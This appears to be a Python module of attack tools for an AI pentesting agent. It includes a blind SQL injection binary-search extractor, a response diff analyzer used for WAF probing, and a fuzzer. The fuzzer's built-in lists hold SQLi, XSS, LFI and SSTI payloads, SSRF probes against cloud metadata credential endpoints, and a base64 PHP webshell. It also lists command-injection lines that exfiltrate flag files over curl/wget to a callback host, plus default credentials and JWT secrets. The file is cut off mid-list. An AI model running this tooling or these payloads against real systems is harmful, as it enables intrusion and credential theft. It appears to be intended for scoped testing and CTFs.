"""Deterministic execution tools for the ReAct pentesting agent.

Zero LLM cost — pure Python algorithmic loops:
- BlindSQLiExtractor: Binary search for blind SQL injection data extraction
- ResponseDiffAnalyzer: Systematic HTTP response comparison
- SystematicFuzzer: Wordlist-based enumeration and fuzzing
"""

from __future__ import annotations

import asyncio
import json
import re
import time
from typing import Any

import httpx
import structlog

from ai_brain.active.scope_guard import ActiveScopeGuard

logger = structlog.get_logger()


# ── Goja 502 Detection & Auto-Fallback ──────────────────────────────

_GOJA_ERROR_MARKERS = (
    "Client.Timeout exceeded",
    "net/http: request canceled",
    "dial tcp",
    "connection refused",
    "no such host",
    "TLS handshake timeout",
    "context deadline exceeded",
    "i/o timeout",
    "connection reset by peer",
    "EOF",
)


def _is_goja_502(resp: httpx.Response) -> bool:
    """Detect Goja proxy error responses (502 with Go net/http errors).

    When Goja's internal Go HTTP client fails (timeout, DNS, conn refused),
    it returns a 502 with text/plain body containing the Go error string.
    These must NOT be treated as real target responses.
    """
    if resp.status_code != 502:
        return False
    ct = resp.headers.get("content-type", "")
    if "text/plain" not in ct:
        return False
    body = resp.text[:500] if resp.text else ""
    return any(m in body for m in _GOJA_ERROR_MARKERS)


class _GojaFallbackClient(httpx.AsyncClient):
    """httpx.AsyncClient wrapper that auto-retries on Goja 502 errors.

    When Goja proxy returns a 502 with a Go net/http error in the body
    (timeout, DNS failure, connection reset, etc.), this transparently
    retries the same request WITHOUT the proxy so the real target response
    is returned instead of the Goja error page.
    """

    def __init__(self, socks_proxy: str | None = None, **kwargs: Any):
        self._socks_proxy = socks_proxy
        self._base_kwargs = {k: v for k, v in kwargs.items() if k != "proxy"}
        super().__init__(**kwargs)

    async def request(self, method: str, url: Any, **kwargs: Any) -> httpx.Response:
        resp = await super().request(method, url, **kwargs)
        if self._socks_proxy and _is_goja_502(resp):
            logger.warning("goja_502_fallback", url=str(url)[:120], error=resp.text[:120])
            async with httpx.AsyncClient(**self._base_kwargs) as direct:
                resp = await direct.request(method, url, **kwargs)
        return resp

    # Override convenience methods so they route through our request()
    async def get(self, url: Any, **kwargs: Any) -> httpx.Response:
        return await self.request("GET", url, **kwargs)

    async def post(self, url: Any, **kwargs: Any) -> httpx.Response:
        return await self.request("POST", url, **kwargs)

    async def put(self, url: Any, **kwargs: Any) -> httpx.Response:
        return await self.request("PUT", url, **kwargs)

    async def patch(self, url: Any, **kwargs: Any) -> httpx.Response:
        return await self.request("PATCH", url, **kwargs)

    async def delete(self, url: Any, **kwargs: Any) -> httpx.Response:
        return await self.request("DELETE", url, **kwargs)

    async def head(self, url: Any, **kwargs: Any) -> httpx.Response:
        return await self.request("HEAD", url, **kwargs)

    async def options(self, url: Any, **kwargs: Any) -> httpx.Response:
        return await self.request("OPTIONS", url, **kwargs)


def _make_client(
    socks_proxy: str | None = None,
    timeout: int | float = 15,
    follow_redirects: bool = True,
    **kwargs: Any,
) -> httpx.AsyncClient:
    """Create an httpx.AsyncClient with automatic Goja 502 fallback.

    Use this everywhere instead of httpx.AsyncClient(...) directly.
    When socks_proxy is set, returns a _GojaFallbackClient that transparently
    retries failed requests without the proxy.
    """
    client_kwargs: dict[str, Any] = {
        "verify": False,
        "timeout": timeout,
        "follow_redirects": follow_redirects,
        **kwargs,
    }
    if socks_proxy:
        client_kwargs["proxy"] = socks_proxy
        return _GojaFallbackClient(socks_proxy=socks_proxy, **client_kwargs)
    return httpx.AsyncClient(**client_kwargs)


# ── Blind SQL Injection Extractor ─────────────────────────────────────


class BlindSQLiExtractor:
    """Binary search extraction for blind SQL injection — zero LLM cost.

    Extracts string data character-by-character using ~7 HTTP requests per char.
    Supports MySQL, PostgreSQL, MSSQL, and SQLite.
    """

    # DB-specific SQL functions
    _DB_FUNCTIONS = {
        "mysql": {"length": "LENGTH", "ascii": "ASCII", "substring": "SUBSTRING"},
        "postgres": {"length": "LENGTH", "ascii": "ASCII", "substring": "SUBSTRING"},
        "mssql": {"length": "LEN", "ascii": "ASCII", "substring": "SUBSTRING"},
        "sqlite": {"length": "LENGTH", "ascii": "UNICODE", "substring": "SUBSTR"},
    }

    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 120,
                 socks_proxy: str | None = None):
        self._scope_guard = scope_guard
        self._timeout = timeout
        self._client = _make_client(
            socks_proxy=socks_proxy, timeout=10, follow_redirects=True,
        )
        self._request_count = 0

    async def extract(
        self,
        url: str,
        method: str,
        param: str,
        injection_template: str,
        true_condition: dict,
        db_type: str,
        target_query: str,
        max_chars: int = 64,
        **kwargs: Any,
    ) -> dict[str, Any]:
        """Extract string character-by-character via binary search.

        Args:
            url: Target URL.
            method: HTTP method (GET or POST).
            param: Vulnerable parameter name.
            injection_template: SQL template with {query}, {pos}, {mid} placeholders.
            true_condition: How to detect TRUE response.
                {type: "status_code"|"content_contains"|"content_length"|"time_delay", value: ...}
            db_type: Database type (mysql, postgres, mssql, sqlite).
            target_query: SQL query to extract data from.
            max_chars: Maximum characters to extract (default 64).

        Returns:
            {extracted, chars, requests, confidence, errors}
        """
        # Validate scope
        if self._scope_guard:
            self._scope_guard.validate_url(url)

        if db_type not in self._DB_FUNCTIONS:
            return {"error": f"Unsupported db_type: {db_type}. Use: {list(self._DB_FUNCTIONS)}"}

        self._request_count = 0
        errors: list[str] = []
        start_time = time.monotonic()

        # Parse other params from URL query string
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(url)
        other_params = {}
        if parsed.query:
            qs = parse_qs(parsed.query, keep_blank_values=True)
            for k, v in qs.items():
                if k != param:
                    other_params[k] = v[0] if len(v) == 1 else v
        base_url = url.split("?")[0] if "?" in url else url

        # Step 1: Validate the injection works with a known-true test
        try:
            true_payload = injection_template.format(query=target_query, pos="1", mid="0")
            true_resp = await self._send_request(base_url, method, param, true_payload, other_params)
            true_result = self._evaluate_condition(true_resp, true_condition)

            false_payload = injection_template.format(query=target_query, pos="1", mid="126")
            false_resp = await self._send_request(base_url, method, param, false_payload, other_params)
            false_result = self._evaluate_condition(false_resp, true_condition)

            if true_result == false_result:
                return {
                    "extracted": "",
                    "chars": 0,
                    "requests": self._request_count,
                    "confidence": 0.0,
                    "errors": ["Validation failed: true and false conditions produce same result. "
                               "Check injection_template and true_condition."],
                }
        except Exception as e:
            return {
                "extracted": "",
                "chars": 0,
                "requests": self._request_count,
                "confidence": 0.0,
                "errors": [f"Validation error: {e}"],
            }

        # Step 2: Extract character by character
        extracted = []
        for pos in range(1, max_chars + 1):
            if time.monotonic() - start_time > self._timeout:
                errors.append(f"Timeout after {self._timeout}s at position {pos}")
                break

            try:
                char_code = await self._binary_search_char(
                    base_url, method, param, injection_template,
                    true_condition, target_query, pos, other_params,
                )
            except Exception as e:
                errors.append(f"Error at pos {pos}: {e}")
                break

            if char_code is None or char_code == 0:
                # End of string
                break

            extracted.append(chr(char_code))
            logger.debug(
                "blind_sqli_char",
                pos=pos,
                char=chr(char_code),
                requests=self._request_count,
            )

        result_str = "".join(extracted)
        confidence = 0.95 if len(extracted) > 0 else 0.0

        return {
            "extracted": result_str,
            "chars": len(extracted),
            "requests": self._request_count,
            "confidence": confidence,
            "elapsed_seconds": round(time.monotonic() - start_time, 1),
            "errors": errors,
        }

    async def _binary_search_char(
        self,
        url: str,
        method: str,
        param: str,
        template: str,
        true_condition: dict,
        query: str,
        pos: int,
        other_params: dict,
    ) -> int | None:
        """Binary search for ASCII value at position pos (~7 requests)."""
        low, high = 32, 126

        while low <= high:
            mid = (low + high) // 2
            payload = template.format(query=query, pos=str(pos), mid=str(mid))
            resp = await self._send_request(url, method, param, payload, other_params)
            result = self._evaluate_condition(resp, true_condition)

            if result:
                # True: ASCII > mid
                low = mid + 1
            else:
                # False: ASCII <= mid
                high = mid - 1

        # low should be the ASCII value
        if low < 32 or low > 126:
            return None
        return low

    async def _send_request(
        self,
        url: str,
        method: str,
        param: str,
        payload: str,
        other_params: dict,
    ) -> httpx.Response:
        """Send a single HTTP request with the injection payload."""
        self._request_count += 1
        params = dict(other_params)
        params[param] = payload

        # Rate limit: 20ms between requests
        await asyncio.sleep(0.02)

        if method.upper() == "GET":
            return await self._client.get(url, params=params)
        else:
            return await self._client.post(url, data=params)

    def _evaluate_condition(self, response: httpx.Response, true_condition: dict) -> bool:
        """Evaluate whether the response matches the TRUE condition."""
        cond_type = true_condition.get("type", "")
        cond_value = true_condition.get("value")

        if cond_type == "status_code":
            return response.status_code == int(cond_value)
        elif cond_type == "content_contains":
            return str(cond_value) in response.text
        elif cond_type == "content_length":
            # True if response length is close to expected
            expected = int(cond_value)
            actual = len(response.content)
            return abs(actual - expected) < max(50, expected * 0.1)
        elif cond_type == "time_delay":
            # True if response was slow (time-based blind)
            delay = float(cond_value)
            return response.elapsed.total_seconds() >= delay * 0.8
        else:
            logger.warning("unknown_condition_type", type=cond_type)
            return False

    async def close(self) -> None:
        """Close the HTTP client."""
        await self._client.aclose()


# ── Response Diff Analyzer ────────────────────────────────────────────


class ResponseDiffAnalyzer:
    """Systematic HTTP response comparison — zero LLM cost.

    Compares test requests against a baseline to detect blind injection points,
    WAF behavior, and filter rules. Classifies each response as:
    WAF_BLOCKED, SANITIZED, APP_ERROR, PASSED, or INCONCLUSIVE.
    """

    _WAF_SIGNATURES = [
        "access denied", "forbidden", "blocked", "not acceptable",
        "mod_security", "cloudflare", "akamai", "incapsula",
        "request blocked", "waf", "security violation",
    ]

    _ERROR_KEYWORDS = [
        "error", "exception", "traceback", "fatal", "syntax error",
        "undefined", "null reference", "stack trace",
    ]

    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 30,
                 socks_proxy: str | None = None):
        self._scope_guard = scope_guard
        self._timeout = timeout
        self._socks_proxy = socks_proxy

    async def analyze(
        self,
        base_request: dict,
        test_requests: list[dict],
        baseline_samples: int = 3,
        **kwargs: Any,
    ) -> dict[str, Any]:
        """Compare test requests against baseline.

        Args:
            base_request: {url, method, headers, body, params}
            test_requests: [{label, ...overrides to base}]
            baseline_samples: Number of baseline repetitions (default 3).

        Returns:
            {baseline: {avg_status, avg_length, avg_time_ms, variance},
             results: [{label, status, length, time_ms, classification, diff_details}]}
        """
        url = base_request.get("url", "")
        if self._scope_guard:
            self._scope_guard.validate_url(url)

        method = base_request.get("method", "GET").upper()
        headers = base_request.get("headers", {})
        body = base_request.get("body")
        params = base_request.get("params", {})

        async with _make_client(
            socks_proxy=self._socks_proxy, timeout=self._timeout, follow_redirects=True,
        ) as client:
            # Helper: send request with proper body handling (dict=form, str=raw/JSON)
            async def _send(m: str, u: str, h: dict, b: Any, p: dict) -> httpx.Response:
                kwargs: dict[str, Any] = {"headers": dict(h)}  # copy to avoid mutation
                if isinstance(b, dict):
                    kwargs["data"] = b  # form-encoded
                elif b is not None:
                    # Detect JSON strings and set Content-Type header
                    if isinstance(b, str):
                        try:
                            json.loads(b)
                            # Valid JSON -- set content-type if not already set
                            has_ct = any(
                                k.lower() == "content-type" for k in kwargs["headers"]
                            )
                            if not has_ct:
                                kwargs["headers"]["Content-Type"] = "application/json"
                        except (json.JSONDecodeError, ValueError):
                            pass  # Not JSON, send as raw
                    kwargs["content"] = b  # raw string/bytes
                if p:
                    kwargs["params"] = p
                return await client.request(m, u, **kwargs)

            # Step 1: Establish baseline
            baseline_data = []
            for _ in range(baseline_samples):
                await asyncio.sleep(0.05)
                start = time.monotonic()
                try:
                    resp = await _send(method, url, headers, body, params)
                    elapsed_ms = int((time.monotonic() - start) * 1000)
                    baseline_data.append({
                        "status": resp.status_code,
                        "length": len(resp.content),
                        "time_ms": elapsed_ms,
                        "body_sample": resp.text[:500],
                    })
                except Exception as e:
                    baseline_data.append({"error": str(e)})

            # Compute baseline stats
            valid_baselines = [b for b in baseline_data if "error" not in b]
            if not valid_baselines:
                return {
                    "baseline": {"error": "All baseline requests failed"},
                    "results": [],
                }

            avg_status = valid_baselines[0]["status"]
            avg_length = sum(b["length"] for b in valid_baselines) // len(valid_baselines)
            avg_time = sum(b["time_ms"] for b in valid_baselines) // len(valid_baselines)
            length_variance = max(
                abs(b["length"] - avg_length) for b in valid_baselines
            ) if len(valid_baselines) > 1 else 0

            baseline = {
                "avg_status": avg_status,
                "avg_length": avg_length,
                "avg_time_ms": avg_time,
                "length_variance": length_variance,
                "samples": len(valid_baselines),
            }
            baseline_body = valid_baselines[0].get("body_sample", "")

            # Step 2: Send test requests and classify
            results = []
            for test in test_requests:
                label = test.get("label", "unnamed")
                test_url = test.get("url", url)
                test_method = test.get("method", method)
                test_headers = {**headers, **test.get("headers", {})}
                test_body = test.get("body", body)
                test_params = {**params, **test.get("params", {})}

                if self._scope_guard:
                    try:
                        self._scope_guard.validate_url(test_url)
                    except Exception:
                        results.append({
                            "label": label,
                            "error": "URL out of scope",
                            "classification": "SKIPPED",
                        })
                        continue

                await asyncio.sleep(0.05)
                start = time.monotonic()
                try:
                    resp = await _send(
                        test_method, test_url, test_headers, test_body, test_params,
                    )
                    elapsed_ms = int((time.monotonic() - start) * 1000)
                except Exception as e:
                    results.append({
                        "label": label,
                        "error": str(e),
                        "classification": "INCONCLUSIVE",
                    })
                    continue

                # Classify
                classification, diff_details = self._classify_response(
                    resp, avg_status, avg_length, length_variance,
                    avg_time, baseline_body,
                )

                results.append({
                    "label": label,
                    "status": resp.status_code,
                    "length": len(resp.content),
                    "time_ms": elapsed_ms,
                    "classification": classification,
                    "diff_details": diff_details,
                })

        return {"baseline": baseline, "results": results}

    def _classify_response(
        self,
        resp: httpx.Response,
        baseline_status: int,
        baseline_length: int,
        length_variance: int,
        baseline_time: int,
        baseline_body: str,
    ) -> tuple[str, str]:
        """Classify a response against the baseline."""
        body_lower = resp.text[:2000].lower()

        # WAF blocked: 403/406/429 or WAF signatures
        if resp.status_code in (403, 406, 429):
            return "WAF_BLOCKED", f"Status {resp.status_code} (baseline: {baseline_status})"
        for sig in self._WAF_SIGNATURES:
            if sig in body_lower and sig not in baseline_body.lower():
                return "WAF_BLOCKED", f"WAF signature detected: '{sig}'"

        # App error: 500 or error keywords not in baseline
        if resp.status_code >= 500:
            return "APP_ERROR", f"Status {resp.status_code}"
        for kw in self._ERROR_KEYWORDS:
            if kw in body_lower and kw not in baseline_body.lower():
                return "APP_ERROR", f"Error keyword: '{kw}'"

        # Sanitized: response similar but payload stripped
        length_diff = abs(len(resp.content) - baseline_length)
        tolerance = max(100, length_variance * 3)
        if resp.status_code == baseline_status and length_diff < tolerance:
            return "PASSED", f"Status and length match baseline (diff: {length_diff})"

        # Significant length difference
        if length_diff > tolerance:
            return "INCONCLUSIVE", (
                f"Length differs significantly: {len(resp.content)} vs baseline {baseline_length} "
                f"(diff: {length_diff}, tolerance: {tolerance})"
            )

        return "PASSED", "Response matches baseline"


# ── Systematic Fuzzer ─────────────────────────────────────────────────


class SystematicFuzzer:
    """Wordlist-based enumeration — zero LLM cost.

    Fuzzes URLs or request bodies using built-in or custom wordlists.
    Filters results by status code, content, or response length.
    """

    BUILTIN_WORDLISTS: dict[str, list[str]] = {
        "common-dirs": [
            "admin", "administrator", "api", "app", "assets", "auth", "backup",
            "bin", "blog", "cache", "cgi-bin", "config", "console", "content",
            "css", "dashboard", "data", "database", "db", "debug", "dev",
            "docs", "download", "downloads", "editor", "email", "env", "error",
            "export", "feed", "file", "files", "font", "fonts", "graphql",
            "health", "help", "home", "html", "image", "images", "img",
            "import", "include", "includes", "index", "info", "internal",
            "js", "json", "lib", "log", "login", "logout", "logs", "mail",
            "manage", "manager", "media", "misc", "module", "modules",
            "monitor", "new", "node_modules", "old", "page", "pages", "panel",
            "php", "phpinfo", "phpmyadmin", "ping", "plugin", "plugins",
            "portal", "post", "posts", "private", "profile", "public",
            "redirect", "register", "report", "reports", "reset", "resource",
            "resources", "rest", "root", "rss", "script", "scripts", "search",
            "secret", "secure", "security", "server", "service", "services",
            "settings", "setup", "shop", "signin", "signup", "sitemap",
            "sql", "src", "staging", "static", "stats", "status", "storage",
            "store", "style", "styles", "swagger", "sys", "system", "tag",
            "tags", "temp", "template", "templates", "test", "testing",
            "theme", "themes", "tmp", "token", "tool", "tools", "trace",
            "track", "upload", "uploads", "user", "users", "v1", "v2", "v3",
            "vendor", "version", "web", "webmail", "widget", "widgets",
            "wiki", "wp-admin", "wp-content", "wp-includes", "wp-login",
            "xml", "xmlrpc",
        ],
        "common-files": [
            ".env", ".git/config", ".git/HEAD", ".gitignore", ".htaccess",
            ".htpasswd", ".svn/entries", ".well-known/security.txt",
            "CHANGELOG.md", "CONTRIBUTING.md", "Dockerfile", "Gruntfile.js",
            "LICENSE", "Makefile", "README.md", "Rakefile", "SECURITY.md",
            "Vagrantfile", "bower.json", "composer.json", "composer.lock",
            "config.php", "config.yml", "config.xml", "configuration.php",
            "crossdomain.xml", "database.yml", "debug.log", "docker-compose.yml",
            "error.log", "favicon.ico", "gulpfile.js", "humans.txt",
            "info.php", "install.php", "package-lock.json", "package.json",
            "phpinfo.php", "robots.txt", "server-status", "server-info",
            "settings.py", "sitemap.xml", "web.config", "webpack.config.js",
            "wp-config.php", "wp-config.php.bak", "yarn.lock",
        ],
        "sqli-payloads": [
            "'", "''", "\"", "' OR '1'='1", "' OR '1'='1'--",
            "' OR 1=1--", "\" OR 1=1--", "' OR 'a'='a", "') OR ('1'='1",
            "1' ORDER BY 1--", "1' ORDER BY 10--", "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--", "1' UNION SELECT NULL,NULL,NULL--",
            "' AND 1=1--", "' AND 1=2--", "' AND SLEEP(3)--",
            "'; WAITFOR DELAY '0:0:3'--", "' AND (SELECT 1)=1--",
            "1; DROP TABLE test--", "admin'--", "1' AND '1'='1",
            "1' AND '1'='2", "' HAVING 1=1--", "' GROUP BY 1--",
            "'; SELECT pg_sleep(3)--", "1)) OR 1=1--",
            "')) OR (('1'='1", "' OR ''='", "admin' #", "admin'/*",
            "' || '1'='1", "' && '1'='1", "1 OR 1=1", "1' OR '1'='1' #",
            "' UNION ALL SELECT NULL--", "SLEEP(3)#", "1 AND SLEEP(3)",
            "' BENCHMARK(10000000,SHA1('test'))--",
            "';DECLARE @v VARCHAR(8000);SET @v='test';--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",
            "0xBE", "' LIKE '%", "1' AND 1=CONVERT(int,@@version)--",
            "1 UNION SELECT @@version--", "' OR username LIKE '%",
            "' AND ASCII(SUBSTRING(version(),1,1))>50--",
        ],
        "xss-payloads": [
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>", "<body onload=alert(1)>",
            "javascript:alert(1)", "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>", "<img/src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>", "<details/open/ontoggle=alert(1)>",
            "<math><mi>x</mi><annotation-xml encoding=\"text/html\"><svg onload=alert(1)>",
            "<iframe src=javascript:alert(1)>", "'-alert(1)-'",
            "\"-alert(1)-\"", "<xss onafterscriptexecute=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<select onfocus=alert(1) autofocus>",
            "<textarea onfocus=alert(1) autofocus>",
            "<keygen onfocus=alert(1) autofocus>",
            "<video><source onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            "<marquee onstart=alert(1)>",
            "<isindex type=image src=1 onerror=alert(1)>",
            "<<script>alert(1)//<</script>",
            "<img src=\"x`onmo`useover=alert(1)\">",
            "<svg><script>alert(1)</script></svg>",
            "<a href=\"javascript:alert(1)\">click</a>",
            "\"><img src=x onerror=alert(1)>",
            "'><img src=x onerror=alert(1)>",
            "<ScRiPt>alert(1)</ScRiPt>",
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "&#60;script&#62;alert(1)&#60;/script&#62;",
            "<IMG SRC=JaVaScRiPt:alert(1)>",
            "<img src=x:alert(1) onerror=eval(src)>",
            "};alert(1);//", "*/alert(1)/*",
            "${alert(1)}", "{{constructor.constructor('alert(1)')()}}",
            "<div style=\"width:expression(alert(1))\">",
            "<link rel=import href=\"data:text/html,<script>alert(1)</script>\">",
            "<base href=javascript:alert(1)///>",
        ],
        "lfi-payloads": [
            "../../../etc/passwd", "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "....\\/....\\/....\\/etc/passwd",
            "../../../etc/shadow", "../../../etc/hosts",
            "../../../proc/self/environ", "../../../proc/self/cmdline",
            "../../../var/log/apache2/access.log",
            "../../../var/log/nginx/access.log",
            "..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd", "file:///etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=string.rot13/resource=index.php",
            "php://input", "expect://id", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "phar://test.phar/test.txt",
            "/proc/self/fd/0", "/proc/self/fd/1", "/proc/self/fd/2",
            "/dev/null", "/dev/random", "/dev/urandom",
            "....//....//....//....//etc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd",
            "..%00/..%00/..%00/etc/passwd", "..%0d/..%0d/..%0d/etc/passwd",
            "../../../etc/passwd%00.jpg", "../../../etc/passwd%00.html",
            "....//....//....//windows/win.ini",
            "../../../boot.ini", "C:\\boot.ini",
            "\\\\localhost\\c$\\windows\\win.ini",
            "file:///c:/windows/win.ini",
            "..;/..;/..;/etc/passwd",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\/etc/passwd",
        ],
        "default-credentials": [
            "admin:admin", "admin:password", "admin:admin123", "admin:123456",
            "admin:12345678", "admin:admin1234", "admin:root", "admin:toor",
            "admin:letmein", "admin:welcome", "admin:master", "admin:dragon",
            "admin:login", "admin:abc123", "admin:qwerty", "admin:passw0rd",
            "admin:Password1", "admin:admin@123", "admin:administrator",
            "admin:changeme", "admin:secret", "admin:password1",
            "root:root", "root:toor", "root:password", "root:admin",
            "test:test", "test:test123", "test:password",
            "user:user", "user:password", "user:user123",
            "guest:guest", "guest:password",
            "demo:demo", "demo:password", "operator:operator",
            "manager:manager", "support:support",
            "administrator:administrator", "administrator:password",
            "admin:Password123", "admin:P@ssw0rd", "admin:Admin123",
            "admin:default", "admin:pass", "admin:1234",
        ],
        "jwt-secrets": [
            "secret", "password", "123456", "admin", "key",
            "jwt_secret", "jwt-secret", "changeme", "test", "default",
            "super_secret", "s3cr3t", "mysecret", "secretkey", "secret_key",
            "jwt", "token", "auth", "app_secret", "application_secret",
            "hmac_secret", "signing_key", "private_key", "api_key", "apikey",
            "passphrase", "pass", "letmein", "welcome", "monkey",
            "master", "dragon", "qwerty", "login", "1234567890",
            "abc123", "password1", "iloveyou", "sunshine", "princess",
            "football", "charlie", "access", "hello", "shadow",
            "michael", "trustno1", "baseball", "whatever", "freedom",
            "654321", "jordan", "superman", "qazwsx", "ninja",
            "azerty", "solo", "loveme", "starwars", "master123",
            "zaq1@WSX", "P@ssw0rd", "p@ssword", "hunter2", "god",
            "mypassword", "the_secret", "top_secret", "topsecret",
            "supersecret", "1q2w3e4r", "qwerty123", "password123",
            "abc12345", "12345678", "1234", "12345", "123456789",
            "1111", "0000", "root", "toor", "pass123",
            "gfhjkm", "159753", "999999", "qwert", "zxcvbn",
            "HS256_default", "RS256_key", "HMAC_KEY", "JWT_KEY",
            "node_secret", "express_secret", "django_secret", "rails_secret",
            "flask_secret", "laravel_key", "spring_secret", "dotnet_secret",
        ],
        "ssti-payloads": [
            # Polyglot detection probe
            "${{<%[%'\"}}%\\",
            # Jinja2 / Twig / Nunjucks
            "{{7*7}}", "{{7*'7'}}", "{{config}}", "{{self.__class__}}", "{{''.__class__.__mro__}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            # Mako / EL
            "${7*7}", "${self.module.__loader__}", "${T(java.lang.Runtime).getRuntime().exec('id')}",
            # ERB
            "<%= 7*7 %>", "<%= system('id') %>", "<%= `id` %>",
            # Pebble / Slim
            "#{7*7}", "#{T(java.lang.Runtime).getRuntime().exec('id')}",
            # Razor
            "@(7*7)", "@(1+2)",
            # Freemarker
            "<#assign x=7*7>${x}", "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
            # Velocity
            "#set($x=7*7)$x", "#set($e=\"\")$e.class.forName(\"java.lang.Runtime\")",
            # Smarty (PHP)
            "{php}echo 7*7;{/php}", "{system('id')}",
            # Django
            "{% debug %}", "{{settings.SECRET_KEY}}",
        ],
        "ssrf-payloads": [
            # Localhost variants
            "http://127.0.0.1", "http://localhost", "http://[::1]",
            "http://0.0.0.0", "http://0177.0.0.1", "http://0x7f000001",
            "http://2130706433", "http://127.1", "http://127.0.1",
            # Cloud metadata endpoints
            "http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/v1/",
            # Internal services
            "http://127.0.0.1:8080", "http://127.0.0.1:3000", "http://127.0.0.1:8443",
            "http://127.0.0.1:9090", "http://127.0.0.1:5000", "http://127.0.0.1:6379",
            # Protocol schemes
            "file:///etc/passwd", "file:///etc/hosts", "file:///proc/self/environ",
            "gopher://127.0.0.1:25/", "dict://127.0.0.1:11211/stat",
            # Bypass techniques
            "http://127.0.0.1.nip.io", "http://spoofed.burpcollaborator.net",
            "http://127.0.0.1%2509", "http://0x7f.0x0.0x0.0x1",
        ],
        "cmdi-payloads": [
            # Output-based (when reflected)
            "; id", "| id", "|| id", "& id", "&& id", "$(id)", "`id`",
            "; cat /etc/passwd", "| cat /etc/passwd",
            "; cat /FLAG*", "| cat /FLAG*", "$(cat /FLAG*)",
            "; ls -la /", "| ls /",
            # Blind time-based
            "; sleep 5", "| sleep 5", "|| sleep 5", "& sleep 5",
            "&& sleep 5", "$(sleep 5)", "`sleep 5`",
            "; sleep 5 #", "| sleep 5 #",
            # Blind file-based exfiltration
            "; cat /FLAG* > /var/www/html/out.txt",
            "; cp /FLAG* /var/www/html/flag_output.txt",
            "; cat /FLAG* > /tmp/out.txt",
            # Blind OOB (curl/wget)
            "; curl http://{CALLBACK}/$(cat /FLAG* | base64)",
            "; wget http://{CALLBACK}/$(cat /FLAG* | base64)",
            # Filter bypass variants
            ";${IFS}id", "|${IFS}id", ";${IFS}cat${IFS}/etc/passwd",
            ";\tcat\t/etc/passwd", ";{cat,/etc/passwd}",
            "$(cat${IFS}/FLAG*)", "$(cat<>/FLAG*)",
            # Newline-based
            "%0aid", "%0acat /FLAG*", "%0d%0aid",
            # Windows
            "& type C:\\FLAG*", "| type C:\\FLAG*",
            "& ping -n 5 127.0.0.1", "| timeout /t 5",
        ],
        "flag-files": [
            # Common CTF flag locations
            "/FLAG", "/FLAG.txt", "/FLAG.php", "/flag", "/flag.txt", "/flag.php",
            "/root/FLAG", "/root/FLAG.txt", "/root/flag.txt",
            "/home/FLAG", "/home/flag.txt",
            "/tmp/FLAG", "/tmp/flag.txt",
            "/var/www/FLAG", "/var/www/flag.txt",
            "/var/www/html/FLAG", "/var/www/html/flag.txt",
            "/opt/FLAG", "/opt/flag.txt",
            "/app/FLAG", "/app/flag.txt",
            "FLAG", "FLAG.txt", "FLAG.php", "flag", "flag.txt", "flag.php",
            "../FLAG", "../FLAG.txt", "../FLAG.php", "../flag.txt", "../flag.php",
            "../../FLAG", "../../FLAG.txt", "../../FLAG.php", "../../flag.txt", "../../flag.php",
            "../../../FLAG", "../../../FLAG.txt", "../../../FLAG.php", "../../../flag.txt",
            "../../../../FLAG", "../../../../FLAG.php", "../../../../flag.txt",
            "../../../../../FLAG", "../../../../../FLAG.php", "../../../../../flag.txt",
            "../../../../../../FLAG", "../../../../../../FLAG.php",
            "../../../../../../../FLAG", "../../../../../../../FLAG.php",
            "../../../../../../../../FLAG", "../../../../../../../../FLAG.php",
            # PHP wrapper variants
            "php://filter/convert.base64-encode/resource=/FLAG",
            "php://filter/convert.base64-encode/resource=/FLAG.php",
            "php://filter/convert.base64-encode/resource=FLAG",
            "php://filter/convert.base64-encode/resource=FLAG.php",
            # Encoding variants
            "..%2FFLAG", "..%2F..%2FFLAG", "..%2F..%2F..%2FFLAG",
            "%2e%2e%2fFLAG", "%2e%2e%2f%2e%2e%2fFLAG",
            "....//FLAG", "....//....//FLAG", "....//....//....//FLAG",
        ],
        "nosqli-payloads": [
            # Operator injection (PHP/Node.js array parsing)
            '{"$ne": "x"}', '{"$gt": ""}', '{"$regex": ".*"}',
            '{"$exists": true}', '{"$in": ["admin"]}',
            "[$ne]=x", "[$gt]=", "[$regex]=.*", "[$exists]=true",
            "[$in][]=admin", "[$nin][]=x",
            # Auth bypass pairs (username + password)
            "username[$ne]=x&password[$ne]=x",
            "username=admin&password[$ne]=x",
            "username=admin&password[$regex]=.*",
            "username[$regex]=^admin&password[$ne]=x",
            "username[$gt]=&password[$gt]=",
            # JavaScript injection ($where)
            "' || 1==1//", "'; return true//",
            "1; return true", "'; sleep(5000)//",
            "this.password.match(/.*/)//",
            # JSON body payloads
            '{"username": "admin", "password": {"$ne": ""}}',
